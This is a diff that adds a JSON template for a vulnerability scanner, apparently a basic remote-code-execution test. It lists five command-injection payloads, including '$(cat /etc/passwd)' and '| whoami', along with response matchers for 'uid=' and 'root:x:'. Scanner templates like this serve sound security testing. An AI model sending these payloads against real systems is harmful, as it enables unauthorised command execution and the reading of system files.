@@ -1,0 +1,58 @@
+[
+  {
+    "id": "rce-basic",
+    "info": {
+      "name": "Remote Code Execution - Basic Tests",
+      "severity": "critical",
+      "category": "code-execution",
+      "description": "Tests for remote code execution vulnerabilities",
+      "references": [
+        "https://owasp.org/www-community/attacks/Code_Injection"
+      ],
+      "tags": [
+        "rce",
+        "code-execution",
+        "command-injection"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "; ls -la",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "| whoami",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "`id`",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "$(cat /etc/passwd)",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "&& cat /etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "uid=",
+          "gid=",
+          "root:x:",
+          "drwxr"
+        ]
+      }
+    ]
+  }
+]
